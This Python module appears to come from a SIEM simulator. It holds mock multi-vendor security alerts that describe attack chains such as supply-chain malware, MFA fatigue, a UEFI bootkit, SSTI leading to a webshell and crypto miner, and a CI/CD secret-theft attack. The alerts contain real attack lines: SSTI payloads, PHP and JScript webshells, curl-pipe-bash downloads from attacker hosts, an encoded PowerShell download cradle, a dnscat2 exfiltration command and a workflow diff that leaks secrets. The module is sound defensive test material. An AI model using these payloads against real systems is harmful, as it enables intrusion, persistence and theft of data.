"""Sophisticated attack scenario payloads for /qradar/api/siem/scenarios.

Hand-crafted multi-source attack narratives. Each scenario exercises
a specific analytical capability:

  S1 — Living-off-the-Land Supply Chain (5 alerts, 4 tools, 47 min)
  S2 — Identity Attack Chain: MFA fatigue → token theft → persistence
  S3 — UEFI Firmware Bootkit Persistence
  S4 — Insider Threat + Steganographic Exfiltration
  S5 — Zero-day SSTI → Webshell → Crypto Miner

Each raw alert (Proofpoint / Defender / CrowdStrike / Zscaler / Entra /
Eclypsium / Purview / WAF / CloudWatch) is wrapped as a QRadar offence
so a typical QRadar ingestion script consumes it byte-identically — no
script changes needed.

Stable offence IDs across the scenario library so consumer dedup-by-id
treats each replay as the same incident. To force re-ingest, bump the
``SCENARIO_ID_BASE`` constant or POST /qradar/_debug/reset_scenarios.
"""

from __future__ import annotations

import json
from typing import Any  # noqa: F401  — kept for backwards-compatible re-imports

from siemulator.config import MOCK_SOURCE  # noqa: F401  — re-exported for callers

SCENARIO_ID_BASE = 90_000


# ── Raw scenario payloads (parsed from the JSON strings) ─────────


def _j(s: str) -> dict:
    """Parse a JSON string, fail loud at module-load if malformed."""
    return json.loads(s)


_S1_A1 = _j(r"""
{
  "source": "Proofpoint TAP", "event_type": "MessagesDelivered",
  "timestamp": "2026-05-22T08:14:22Z", "severity": "Low", "confidence": 35,
  "message": {
    "from": "david.chen@partnertech.com",
    "to": ["procurement@acmecorp.com"],
    "subject": "Updated vendor agreement - Q2 pricing revision",
    "urls": [{"url": "https://partnertech-my.sharepoint.com/personal/d_chen/_layouts/15/download.aspx?UniqueId=7a2b3c4d-5e6f-7890-abcd-ef1234567890",
              "rewritten": true, "verdict": "clean"}],
    "threat_score": 15, "classification": "clean",
    "note": "Sender is a known contact — 47 previous emails in last 90 days. SPF=pass, DKIM=pass, DMARC=pass. Legitimate SharePoint sharing link from a verified partner."
  }
}
""")

_S1_A2 = _j(r"""
{
  "source": "Microsoft Defender for Endpoint", "event_type": "AlertEvidence",
  "timestamp": "2026-05-22T08:31:47Z", "severity": "Medium", "confidence": 55,
  "alert": {"name": "Suspicious file download from SharePoint",
            "category": "InitialAccess"},
  "device": {"hostname": "PROC-WS-0331", "ip": "10.10.15.31",
             "user": "CORPB\\s.rahman", "department": "Procurement",
             "risk_level": "Medium", "s3_score": 65},
  "file": {"name": "VendorAgreement_Q2_2026_PricingTool.exe",
           "sha256": "b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8",
           "signed": true, "signer": "PartnerTech Solutions Inc.",
           "certificate_valid": true,
           "note": "Binary is validly signed by known partner organization."},
  "process": {"parent": "chrome.exe"}
}
""")

_S1_A3 = _j(r"""
{
  "source": "CrowdStrike Falcon", "event_type": "DetectionSummaryEvent",
  "timestamp": "2026-05-22T08:32:14Z", "severity": "Medium", "confidence": 60,
  "detection": {"name": "Suspicious DLL Side-Loading",
                "description": "Signed binary loaded unsigned DLL from same directory",
                "technique": "T1574.002"},
  "host": {"hostname": "PROC-WS-0331", "ip": "10.10.15.31", "s3_score": 65},
  "user": {"username": "CORPB\\s.rahman", "department": "Procurement"},
  "process": {
    "name": "VendorAgreement_Q2_2026_PricingTool.exe",
    "sha256": "b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8",
    "signer": "PartnerTech Solutions Inc.",
    "loaded_dlls": [{"name": "version.dll", "path": "C:\\Users\\s.rahman\\Downloads\\version.dll",
                     "signed": false, "note": "DLL side-loaded from Downloads instead of System32"}],
    "children": [
      {"command_line": "cmd.exe /c schtasks /create /tn \"VendorPricingSync\" /tr \"C:\\Users\\s.rahman\\AppData\\Local\\VendorTools\\sync.exe\" /sc hourly /mo 1 /f",
       "note": "Hourly persistence task created"},
      {"command_line": "cmd.exe /c copy ...Downloads...PricingTool.exe ...AppData...sync.exe",
       "note": "Binary copied to persistent location"}
    ]
  }
}
""")

_S1_A4 = _j(r"""
{
  "source": "Microsoft Defender for Endpoint", "event_type": "AlertEvidence",
  "timestamp": "2026-05-22T08:47:33Z", "severity": "High", "confidence": 75,
  "alert": {"name": "Living-off-the-land binary used for reconnaissance",
            "category": "Discovery"},
  "device": {"hostname": "PROC-WS-0331", "user": "CORPB\\s.rahman"},
  "process_tree": [
    {"name": "sync.exe", "parent": "svchost.exe",
     "note": "Launched by Task Scheduler — hourly persistence task fired"},
    {"command_line": "cmd.exe /c systeminfo > si.txt"},
    {"command_line": "cmd.exe /c ipconfig /all > ip.txt"},
    {"command_line": "cmd.exe /c net group \"Domain Admins\" /domain > da.txt"},
    {"command_line": "cmd.exe /c nltest /dclist:acmecorp.local > dc.txt"},
    {"command_line": "cmd.exe /c net share > sh.txt"},
    {"command_line": "certutil.exe -urlcache -split -f http://10.10.15.31:8080/upload r.txt",
     "note": "LOLBin certutil for data exfil — Volt Typhoon TTP"}
  ]
}
""")

_S1_A5 = _j(r"""
{
  "source": "Zscaler ZIA", "event_type": "WebTransaction",
  "timestamp": "2026-05-22T09:01:15Z", "severity": "High", "confidence": 70,
  "transaction": {
    "user": "s.rahman@acmecorp.com", "device": "PROC-WS-0331",
    "url": "https://api.notion.com/v1/pages", "method": "POST",
    "request_size_bytes": 847291, "response_code": 200,
    "category": "Collaboration Tools", "action": "allowed",
    "note": "Unusual: s.rahman has never used Notion API before. Large POST (847KB) — content appears Base64-encoded data embedded in Notion page body. Known exfil technique abusing legitimate SaaS APIs to bypass DLP."
  },
  "threat_intel": {"url_verdict": "clean", "domain_verdict": "clean"}
}
""")


_S2 = _j(r"""
{
  "source": "Microsoft Entra ID Protection + Defender for Cloud Apps",
  "event_type": "IdentityAttackChain", "severity": "Critical",
  "timestamp_range": "2026-05-22T22:41:00Z to 2026-05-22T23:18:00Z",
  "target_user": {
    "upn": "maria.gonzalez@acmecorp.com", "display_name": "Maria Gonzalez",
    "title": "VP of Engineering", "mfa_method": "Microsoft Authenticator push",
    "privileged_roles": ["Global Reader", "Application Administrator"]
  },
  "events": [
    {"seq": 1, "type": "SignInAttempt", "result": "MFA_DENIED", "source_ip": "185.220.101.34", "location": "Frankfurt, Germany (Tor exit node)"},
    {"seq": 2, "type": "SignInAttempt", "result": "MFA_DENIED"},
    {"seq": 3, "type": "SignInAttempt", "result": "MFA_DENIED"},
    {"seq": 4, "type": "SignInAttempt", "result": "MFA_DENIED", "note": "Pause + 4th push — attacker waiting for fatigue"},
    {"seq": 5, "type": "SignInAttempt", "result": "MFA_DENIED"},
    {"seq": 6, "type": "PhishingEmail", "detail": "Email from 'it-helpdesk@acmecorp-support.com' subject 'MFA Alert: Verify Now' with fake MFA approval link"},
    {"seq": 7, "type": "SignInAttempt", "result": "SUCCESS", "token_type": "PrimaryRefreshToken", "note": "Phishing link auto-approved push — attacker has PRT"},
    {"seq": 8, "type": "ConditionalAccessBypass", "note": "PRT spoofed device compliance claim — bypassed CA policy"},
    {"seq": 9, "type": "MailboxRuleCreated", "detail": "Inbox rule moves security@acmecorp.com + 'compromised'/'unauthorized'/'suspicious activity' to RSS Feeds folder"},
    {"seq": 10, "type": "OAuthAppConsent", "app_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890", "publisher": "Unverified", "permissions": "Mail.ReadWrite, Files.ReadWrite.All, Sites.ReadWrite.All, Directory.Read.All, User.Read.All"},
    {"seq": 11, "type": "SharePointAccess", "detail": "OAuth app bulk-downloaded 47 confidential engineering docs (3.8GB) incl. architecture-roadmap-2027.pptx, salary-bands-engineering.xlsx, acquisition-target-analysis.pdf, source-code-review-audit.docx"},
    {"seq": 12, "type": "EmailForwardRule", "detail": "Auto-forward 'confidential'/'restricted'/'board'/'acquisition' → tech.backup.2026@proton.me"},
    {"seq": 13, "type": "AzureADRoleAssignment", "detail": "Exchange Administrator role assigned to malicious OAuth app's service principal — full tenant Exchange admin rights"}
  ]
}
""")


_S3 = _j(r"""
{
  "source": "Eclypsium Firmware Scanner", "event_type": "FirmwareAnomaly",
  "timestamp": "2026-05-22T14:33:27Z", "severity": "Critical", "confidence": 92,
  "device": {
    "hostname": "EXEC-WS-001", "user": "CORPB\\c.nakamura",
    "title": "Chief Technology Officer", "asset_criticality": "CRITICAL", "s3_score": 98,
    "secure_boot": "Enabled", "tpm_version": "2.0", "bios_vendor": "AMI", "bios_version": "F.52"
  },
  "findings": [
    {"type": "UEFI_MODIFICATION", "severity": "Critical",
     "detail": "Current firmware hash does not match vendor golden image. DXE driver region + NVRAM variables modified. DXE executes before OS — full hardware access, survives OS reinstall."},
    {"type": "SUSPICIOUS_DXE_DRIVER", "severity": "Critical",
     "detail": "Unknown DXE driver 'HwServiceDxe.efi' (not in vendor firmware). Hooks ExitBootServices to inject into Windows kernel. Matches BlackLotus/ESPecter UEFI bootkit profile."},
    {"type": "EFI_SYSTEM_PARTITION_MODIFIED", "severity": "High",
     "detail": "Unsigned bootloader \\EFI\\Microsoft\\Boot\\grubx64.efi in Microsoft boot path — hallmark of UEFI bootkit installation."},
    {"type": "SECURE_BOOT_BYPASS", "severity": "Critical",
     "detail": "Secure Boot enabled but DBX outdated (2025-03-15). CVE-2022-21894 'Baton Drop' + CVE-2023-24932 'BlackLotus' not revoked. Attacker used signed-vulnerable bootloader to load unsigned UEFI implant."}
  ],
  "timeline_context": {
    "last_clean_scan": "2026-04-15", "first_anomaly": "2026-05-22T14:33:27Z",
    "user_travel": "Attended Shenzhen conference May 10-17. Laptop on hotel WiFi.",
    "physical_access": "Laptop left in hotel room safe May 12 evening.",
    "recent_incidents": "Reported suspicious USB found inserted May 15 — removed + EDR-scanned (clean) but no firmware scan."
  }
}
""")


_S4 = _j(r"""
{
  "source": "Microsoft Purview DLP + UEBA", "event_type": "InsiderRiskAlert",
  "timestamp": "2026-05-22T16:45:00Z", "severity": "High", "confidence": 78,
  "risk_policy": "Data exfiltration by departing employee",
  "user": {
    "upn": "alex.petrov@acmecorp.com", "display_name": "Alex Petrov",
    "title": "Senior Machine Learning Engineer", "department": "AI Research",
    "tenure_years": 4.2, "hr_status": "NOTICE_PERIOD",
    "resignation_date": "2026-05-15", "last_day": "2026-06-14",
    "new_employer": "Unknown (LinkedIn 'Open to Work' since May 10)",
    "access_level": "L4 — proprietary ML models, training datasets, research IP"
  },
  "behavioral_indicators": [
    {"type": "ABNORMAL_ACCESS_PATTERN", "detail": "340 files accessed in ML model repo 23:00-03:00 (28.3x deviation from 12-files/day baseline)"},
    {"type": "SENSITIVE_DATA_DOWNLOAD", "detail": "Downloaded GPT-AcmeFinance-v3.safetensors (4.2GB), AcmeVision-ObjectDetect-v2.onnx (1.8GB), TrainingData-FinancialNER-2026.parquet (12.3GB) = 18.3GB classified IP"},
    {"type": "STEGANOGRAPHIC_EXFILTRATION", "detail": "Uploaded 847 high-res PNGs (6.7GB) to personal Flickr. LSB entropy 7.98 (normal photos 2.0-4.0; random data 8.0). ~4-5GB hidden via steganography — matches ML model weights volume.", "confidence_steganography": 96},
    {"type": "EVIDENCE_DESTRUCTION", "detail": "Ran 'cipher /w:Downloads' (secure wipe), cleared Chrome history, deleted FlickrUploader logs"}
  ],
  "non_compete": {"status": "Active", "scope": "ML/AI roles at competitors for 24 months",
                  "ip_assignment": "All work product CORPB property per employment agreement S 7.3"}
}
""")


_S5_A1 = _j(r"""
{
  "source": "AWS WAF", "event_type": "WAFBlock", "action": "BLOCK",
  "timestamp": "2026-05-22T03:14:22Z", "severity": "Medium",
  "request": {"method": "POST", "uri": "/api/v2/reports/generate",
              "source_ip": "103.145.22.87", "country": "VN",
              "body_preview": "{\"template\":\"{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}\",\"format\":\"pdf\"}",
              "rule_matched": "AWSManagedRulesKnownBadInputsRuleSet",
              "note": "SSTI attempt in report generation endpoint — WAF blocked"}
}
""")

_S5_A2 = _j(r"""
{
  "source": "AWS WAF", "event_type": "WAFAllow", "action": "ALLOW",
  "timestamp": "2026-05-22T03:22:47Z", "severity": "Low",
  "request": {"method": "POST", "uri": "/api/v2/reports/generate",
              "source_ip": "103.145.22.87", "country": "VN",
              "body_preview": "{\"template\":\"{{range.constructor(\\\"return this\\\")().process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}}\",\"format\":\"pdf\"}",
              "rule_matched": "NONE", "response_code": 200, "response_size_bytes": 4891,
              "note": "Same attacker IP, different SSTI payload BYPASSED WAF. 200 + 4.8KB response suggests /etc/passwd content leaked."}
}
""")

_S5_A3 = _j(r"""
{
  "source": "CrowdStrike Falcon (Container Sensor)", "event_type": "DetectionSummaryEvent",
  "timestamp": "2026-05-22T03:24:15Z", "severity": "Critical", "confidence": 90,
  "detection": {"name": "Web shell dropped via application exploit", "technique": "T1505.003"},
  "container": {"name": "reporting-api-7f8d9c", "k8s_namespace": "production",
                "k8s_pod": "reporting-api-7f8d9c-x9k2p", "node": "k8s-worker-07"},
  "process": {
    "name": "node",
    "children": [
      {"command_line": "sh -c echo '<?php system($_GET[\"c\"]); ?>' > /app/public/uploads/.health-check.php",
       "note": "PHP webshell written to uploads with hidden filename"},
      {"command_line": "sh -c curl -s http://103.145.22.87:8443/miner.tar.gz | tar xz -C /tmp/.cache/ && /tmp/.cache/xmrig -o pool.supportxmr.com:443 -u 49Uj...addr...REDACTED -p worker-acme-k8s-07 --tls --background",
       "note": "XMRig miner downloaded + executed. Worker name 'worker-acme-k8s-07' identifies victim."},
      {"command_line": "sh -c (crontab -l; echo '*/10 * * * * curl -s http://103.145.22.87:8443/update.sh | bash') | crontab -",
       "note": "Persistence via crontab — re-downloads update script every 10 min"}
    ]
  },
  "network": {"connections": [
    {"remote_ip": "103.145.22.87", "remote_port": 8443, "note": "C2/download server"},
    {"remote_ip": "pool.supportxmr.com", "remote_port": 443, "note": "XMRig mining pool"}
  ]}
}
""")

_S5_A4 = _j(r"""
{
  "source": "AWS CloudWatch", "event_type": "AnomalyDetection",
  "timestamp": "2026-05-22T04:15:00Z", "severity": "High",
  "anomaly": {
    "type": "CPU_SPIKE", "resource": "k8s-worker-07",
    "current_value": 98.7, "baseline_value": 23.4, "deviation_sigma": 8.2,
    "duration_minutes": 51,
    "note": "CPU 23%→99% at 03:24 (exactly when miner started). Production app response times: 120ms→4200ms."
  },
  "cost_impact": {"estimated_additional_cost_24h": 847.00, "estimated_monthly_impact": 25410.00}
}
""")


# ── v2 advanced test payloads (TEST A–J, 2026-06-01) ────────────────
# Source: SARA_Advanced_Test_Payloads_v2.py. Each tests a different
# capability — Kerberos / Exchange / DNS tunnel / SIM swap / Linux
# rootkit / BEC / CI-CD / medical OT / deepfake vishing / GPO abuse.

_TA = _j(r"""
{
  "source": "Microsoft Defender for Identity",
  "event_type": "SuspiciousActivity",
  "timestamp": "2026-06-01T02:33:17Z",
  "severity": "Critical", "confidence": 92,
  "alert": {"name": "Suspected Golden Ticket usage",
            "description": "TGT lifetime exceeds domain policy max (10h) by 87.6x (876h/36.5d). RC4-HMAC instead of AES256.",
            "technique": "T1558.001"},
  "source_device": {"hostname": "DEV-WS-0194", "ip": "10.10.22.94", "os": "Windows 11 Enterprise",
                    "domain": "CORPB", "last_logon_user": "CORPB\\t.williams", "department": "Software Development"},
  "ticket_details": {"ticket_type": "TGT", "target_domain": "acmecorp.local",
                     "encryption_type": "RC4-HMAC (0x17)", "domain_policy_encryption": "AES256-CTS-HMAC-SHA1-96 (0x12)",
                     "ticket_lifetime_hours": 876, "domain_max_ticket_lifetime_hours": 10,
                     "forged_username": "krbtgt",
                     "forged_sid": "S-1-5-21-3398765432-1234567890-9876543210-502",
                     "source_sid": "S-1-5-21-3398765432-1234567890-9876543210-1194",
                     "source_username": "t.williams",
                     "note": "krbtgt hash likely compromised via DCSync or NTDS.dit. Forged TGT grants domain-admin-equivalent for 36.5 days."},
  "lateral_movement_observed": [
    {"timestamp": "2026-06-01T02:34:02Z", "target": "FIN-DB-PRIMARY (10.10.8.10)", "service": "MSSQLSvc/...:1433", "result": "success"},
    {"timestamp": "2026-06-01T02:34:44Z", "target": "HR-FILESERVER (10.10.9.5)", "service": "cifs/...", "result": "success"},
    {"timestamp": "2026-06-01T02:35:21Z", "target": "DC-PRIMARY (10.10.1.1)", "service": "ldap/...", "result": "success"}
  ]
}
""")

_TB = _j(r"""
{
  "source": "CrowdStrike Falcon", "event_type": "DetectionSummaryEvent",
  "timestamp": "2026-06-01T04:18:33Z", "severity": "Critical", "confidence": 88,
  "detection": {"name": "Webshell Activity on Exchange Server",
                "description": "Suspicious process tree from w3wp.exe (IIS worker) on Exchange Server"},
  "host": {"hostname": "EXCH-01", "ip": "10.10.3.10", "os": "Windows Server 2019",
           "role": "Exchange Server 2019 CU12", "patch_level": "March 2024 SU",
           "domain": "CORPB", "s3_score": 95, "internet_facing": true},
  "process_tree": [
    {"name": "w3wp.exe", "pid": 4412, "user": "NT AUTHORITY\\SYSTEM",
     "command_line": "w3wp.exe -ap \"MSExchangeOWAAppPool\"", "note": "IIS worker for OWA"},
    {"name": "cmd.exe", "pid": 7891, "parent_pid": 4412, "command_line": "cmd.exe /c whoami"},
    {"name": "powershell.exe", "pid": 8012, "parent_pid": 4412,
     "command_line": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAGwAbwBhAGQAJwApAA==",
     "note": "Base64 decodes to: iex (new-object net.webclient).downloadstring('http://198.51.100.77/load')"},
    {"name": "cmd.exe", "pid": 8145, "parent_pid": 4412,
     "command_line": "cmd.exe /c echo <%@ Page Language=\"JScript\"%><%eval(Request.Item[\"exec\"],\"unsafe\");%> > C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\4_0_30319\\error_page.aspx",
     "note": "JScript webshell written to Exchange web dir"},
    {"name": "net.exe", "pid": 8234, "parent_pid": 4412,
     "command_line": "net user backdoor P@ssw0rd2026! /add /domain"},
    {"name": "net.exe", "pid": 8267, "parent_pid": 4412,
     "command_line": "net group \"Exchange Organization Administrators\" backdoor /add /domain"}
  ],
  "iis_logs": {"suspicious_requests": [
    {"timestamp": "2026-06-01T04:17:55Z", "method": "GET",
     "uri": "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com",
     "status": 200, "source_ip": "198.51.100.77", "note": "ProxyShell SSRF probe"},
    {"timestamp": "2026-06-01T04:18:12Z", "method": "POST",
     "uri": "/autodiscover/autodiscover.json?@evil.com/EWS/exchange.asmx?&Email=autodiscover/autodiscover.json%3f@evil.com",
     "status": 200, "source_ip": "198.51.100.77", "note": "ProxyShell exploit → EWS mailbox access"}
  ]},
  "network": {"outbound_connections": [
    {"dst_ip": "198.51.100.77", "dst_port": 80, "protocol": "HTTP", "note": "C2 download"},
    {"dst_ip": "198.51.100.77", "dst_port": 443, "protocol": "HTTPS", "note": "C2 callback"}
  ]}
}
""")

_TC = _j(r"""
{
  "source": "Infoblox BloxOne Threat Defense", "event_type": "DNSExfiltrationDetected",
  "timestamp": "2026-06-01T11:22:45Z", "severity": "High", "confidence": 82,
  "alert": {"name": "DNS Tunneling Activity Detected",
            "description": "High-entropy DNS queries with abnormal subdomain length and frequency"},
  "source_device": {"hostname": "ENG-WS-0455", "ip": "10.10.20.55",
                    "user": "CORPB\\j.park", "department": "Engineering", "os": "macOS Sequoia 16.1"},
  "dns_analysis": {
    "query_domain": "t1.data.update-check-cdn.net",
    "authoritative_ns": "ns1.update-check-cdn.net (45.77.65.211)",
    "query_patterns": {
      "sample_queries": ["dGhpcyBpcyB0ZXN0.t1.data.update-check-cdn.net",
                         "IGRhdGEgZm9yIGV4.t1.data.update-check-cdn.net",
                         "ZmlsdHJhdGlvbiB2.t1.data.update-check-cdn.net",
                         "aWEgRE5TIHR1bm5l.t1.data.update-check-cdn.net",
                         "bGluZyBjaGFubmVs.t1.data.update-check-cdn.net"],
      "subdomain_avg_length": 28, "normal_subdomain_avg_length": 8,
      "subdomain_entropy": 4.8, "normal_subdomain_entropy": 2.1,
      "query_frequency_per_minute": 47, "normal_frequency_per_minute": 3,
      "total_queries_1hr": 2847, "estimated_data_exfiltrated_mb": 12.4,
      "query_type": "TXT",
      "note": "Subdomains are Base64 chunks ~45 bytes each. At 47 q/min ≈ 2KB/s exfil rate."
    },
    "domain_registration": {"domain": "update-check-cdn.net", "registrar": "Namecheap",
                            "registration_date": "2026-05-28", "registrant": "WHOIS Privacy",
                            "age_days": 4, "note": "Domain registered 4 days ago"}
  },
  "process_context": {"process": "dnscat2", "pid": 44892,
                      "path": "/Users/j.park/.local/bin/dnscat2",
                      "parent": "bash", "grandparent": "Terminal.app",
                      "command_line": "dnscat2 --dns server=update-check-cdn.net,port=53 --secret=AcmeExfil2026",
                      "started": "2026-06-01T10:45:00Z",
                      "note": "dnscat2 — open-source DNS tunneling tool; --secret = encrypted tunnel"}
}
""")

_TD = _j(r"""
{
  "source": "Okta System Log + Twilio Verify", "event_type": "IdentityCompromise",
  "timestamp": "2026-06-01T19:33:00Z", "severity": "Critical", "confidence": 85,
  "target_user": {"email": "cto@acmecorp.com", "display_name": "Sarah Chen", "title": "Chief Technology Officer",
                  "mfa_methods": ["SMS (+1-415-555-0187)", "Okta Verify Push"],
                  "last_successful_login": "2026-06-01T08:22:00Z", "login_location": "San Francisco, CA"},
  "events": [
    {"sequence": 1, "timestamp": "2026-06-01T19:33:00Z", "source": "Twilio Verify",
     "type": "SMS_DELIVERY_FAILURE",
     "detail": "SMS to +1-415-555-0187 failed — carrier reports 'number not in service'. Last delivery 11h ago.",
     "note": "Sudden SMS failure → SIM swap"},
    {"sequence": 2, "timestamp": "2026-06-01T19:33:45Z", "source": "Okta", "type": "LOGIN_ATTEMPT",
     "result": "MFA_CHALLENGE_SMS", "source_ip": "104.28.55.101", "location": "Miami, FL",
     "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)",
     "note": "Login from Miami while last login from SF; MFA via SMS — attacker has the SIM"},
    {"sequence": 3, "timestamp": "2026-06-01T19:34:12Z", "source": "Twilio Verify", "type": "SMS_OTP_DELIVERED",
     "detail": "OTP delivered to +1-415-555-0187 but IMEI changed. New IMEI: 354847291034567",
     "note": "OTP to attacker's device after SIM swap"},
    {"sequence": 4, "timestamp": "2026-06-01T19:34:33Z", "source": "Okta", "type": "LOGIN_SUCCESS",
     "result": "MFA_VERIFIED_SMS", "source_ip": "104.28.55.101", "session_token": "session_a7b3c9d2e4f1"},
    {"sequence": 5, "timestamp": "2026-06-01T19:36:00Z", "source": "Okta", "type": "MFA_FACTOR_RESET",
     "detail": "All MFA factors reset. Okta Verify Push removed. New authenticator enrolled from IMEI 354847291034567.",
     "note": "Attacker locks out real user"},
    {"sequence": 6, "timestamp": "2026-06-01T19:38:22Z", "source": "Okta", "type": "ADMIN_ROLE_ASSIGNED",
     "detail": "cto@acmecorp.com granted 'Super Administrator'. Previous: 'Read-Only Administrator'.",
     "source_ip": "104.28.55.101", "note": "Privilege escalation"},
    {"sequence": 7, "timestamp": "2026-06-01T19:40:15Z", "source": "Okta", "type": "POLICY_MODIFIED",
     "detail": "Session lifetime 8h→720h (30d). MFA re-prompt 'every login'→'every 30 days'.",
     "note": "Weakening security for persistence"},
    {"sequence": 8, "timestamp": "2026-06-01T19:42:00Z", "source": "AWS CloudTrail", "type": "FEDERATED_LOGIN",
     "detail": "Federated AWS Console login via Okta SSO. Assumed role: AWSAdministratorAccess. Region: us-east-1.",
     "source_ip": "104.28.55.101", "note": "Full AWS admin via Okta federation"}
  ]
}
""")

_TE = _j(r"""
{
  "source": "OSSEC HIDS", "event_type": "RootkitDetection",
  "timestamp": "2026-06-01T06:15:33Z", "severity": "Critical", "confidence": 90,
  "host": {"hostname": "web-prod-03", "ip": "10.10.50.3", "os": "Ubuntu 22.04 LTS",
           "kernel": "5.15.0-91-generic", "role": "Production Web Server (nginx + Node.js API)",
           "uptime_days": 127, "last_patched": "2026-04-10"},
  "findings": [
    {"type": "HIDDEN_PROCESS",
     "detail": "Process not in /proc but found via /dev/kmem. PID 31337 as root. Binary: /usr/lib/systemd/.sd-pam-helper",
     "ps_visible": false, "proc_visible": false, "kmem_visible": true,
     "network_connections": [{"remote_ip": "91.215.85.104", "remote_port": 443, "protocol": "TCP", "state": "ESTABLISHED"}]},
    {"type": "KERNEL_MODULE_ANOMALY",
     "detail": "Module 'netfilter_helper' not in /lib/modules/ or package mgr. Hooks getdents64, kill, read.",
     "module_name": "netfilter_helper",
     "module_hash": "d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6a7b8c9",
     "hooked_syscalls": ["sys_getdents64", "sys_kill", "sys_read"],
     "in_package_manager": false,
     "note": "Hooking getdents64 hides files; sys_read filters /proc; LKM rootkit."},
    {"type": "HIDDEN_FILES",
     "detail": "Hidden from userspace but visible via direct disk read.",
     "hidden_files": [
       {"path": "/usr/lib/systemd/.sd-pam-helper", "size_kb": 284, "type": "ELF x86_64"},
       {"path": "/usr/lib/systemd/.sd-pam-helper.conf", "size_kb": 2, "type": "text/plain"},
       {"path": "/var/log/.journal-audit", "size_kb": 48128, "type": "data (encrypted)"}
     ]},
    {"type": "TIMESTAMP_MANIPULATION",
     "detail": "Files show 2024-01-15 but ext4 crtime = 2026-05-18T03:22:44Z",
     "displayed_time": "2024-01-15T00:00:00Z", "actual_crtime": "2026-05-18T03:22:44Z",
     "note": "Timestomping — touch -r from legit systemd files"},
    {"type": "SSH_KEY_INJECTION",
     "detail": "Unauthorized SSH key in /root/.ssh/authorized_keys",
     "key_fingerprint": "SHA256:nThBg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8",
     "key_comment": "maintenance@internal", "note": "Persistence via SSH key"}
  ]
}
""")

_TF = _j(r"""
{
  "source": "Microsoft Defender for Office 365", "event_type": "PhishingDetection",
  "timestamp": "2026-06-01T14:22:00Z", "severity": "High", "confidence": 72,
  "email": {
    "from": {"display_name": "James Morrison (CEO)", "address": "james.morrison@acmecorp.co",
             "note": "Legit CEO email = .COM, this uses .CO (Colombia TLD)"},
    "reply_to": "jmorrison.private@gmail.com",
    "to": "accounts.payable@acmecorp.com",
    "subject": "Urgent Wire Transfer — Confidential",
    "authentication": {"spf": "pass (acmecorp.co)", "dkim": "pass (acmecorp.co)", "dmarc": "pass (acmecorp.co)"},
    "headers": {"x_mailer": "Apple Mail (2658.1)", "x_originating_ip": "none",
                "received_from": "mail-yw1-f175.google.com (Gmail relay)"},
    "body_text": "Hi Team,\n\nI need a wire transfer processed today — related to the acquisition we discussed at last week's board meeting. Time-sensitive and confidential, please don't discuss outside this thread.\n\nVendor: Meridian Strategic Partners LLC\nBank: JPMorgan Chase\nRouting: 021000021\nAccount: 7783924156\nAmount: $347,000.00\nReference: Project Falcon - Phase 2 Advisory Fee\n\nProcess before 3pm EST and confirm to my personal email (reply-to) since I'm traveling and corp email has sync issues.\n\nThanks,\nJames\n— Sent from my iPhone",
    "attachments": [], "urls": []
  },
  "context": {"ceo_real_email": "james.morrison@acmecorp.com",
              "ceo_current_status": "CEO is traveling internationally this week (confirmed by EA)",
              "board_meeting": "Board meeting last week — acquisition discussions confirmed",
              "vendor_lookup": "Meridian Strategic Partners LLC — no prior invoices or vendor records in AP",
              "note": "Sophisticated BEC: insider knowledge of board, CEO travel, org structure. No URLs/attachments — pure social engineering."}
}
""")

_TG = _j(r"""
{
  "source": "GitHub Advanced Security + Falco", "event_type": "CICDCompromise",
  "timestamp": "2026-06-01T09:15:00Z", "severity": "Critical", "confidence": 88,
  "repository": {"name": "acmecorp/payment-service", "visibility": "private", "branch": "main",
                 "protection_rules": "Require 2 approvals, status checks, no force push",
                 "last_clean_build": "2026-05-31T18:00:00Z"},
  "events": [
    {"sequence": 1, "timestamp": "2026-06-01T09:12:00Z", "type": "WORKFLOW_MODIFIED",
     "detail": ".github/workflows/deploy.yml modified by 'renovate-bot[bot]'. Added 'cache-optimization' step before build.",
     "diff": "+ - name: Cache optimization\n+   run: |\n+     curl -sSL https://npm-cache-optimize.dev/v2/setup.sh | bash\n+     echo \"CACHE_TOKEN=${{ secrets.NPM_TOKEN }}\" >> $GITHUB_ENV\n+     echo \"DEPLOY_KEY=${{ secrets.AWS_DEPLOY_KEY }}\" >> $GITHUB_ENV",
     "note": "Renovate Bot only modifies package.json/lock — never workflow files. This is impersonation."},
    {"sequence": 2, "timestamp": "2026-06-01T09:15:00Z", "type": "WORKFLOW_EXECUTION",
     "detail": "deploy.yml triggered. cache-optimization step ran. External script downloaded + executed.",
     "secrets_exposed": ["NPM_TOKEN", "AWS_DEPLOY_KEY"], "runner": "ubuntu-latest (GitHub-hosted)",
     "note": "curl|bash pattern in CI with secrets exposed"},
    {"sequence": 3, "timestamp": "2026-06-01T09:15:22Z", "type": "SECRET_EXFILTRATION",
     "detail": "DNS TXT query from runner to npm-cache-optimize.dev with Base64 NPM_TOKEN + AWS_DEPLOY_KEY",
     "exfiltrated_secrets": ["NPM_TOKEN", "AWS_DEPLOY_KEY"], "exfil_method": "DNS TXT query"},
    {"sequence": 4, "timestamp": "2026-06-01T09:18:44Z", "type": "NPM_PACKAGE_PUBLISHED",
     "detail": "Stolen NPM_TOKEN used to publish @acmecorp/payment-sdk v3.4.1→v3.4.2 with attacker-controlled 'helper-utils-x' dependency.",
     "package": "@acmecorp/payment-sdk", "version": "3.4.2",
     "note": "Supply chain: backdoored own npm package"},
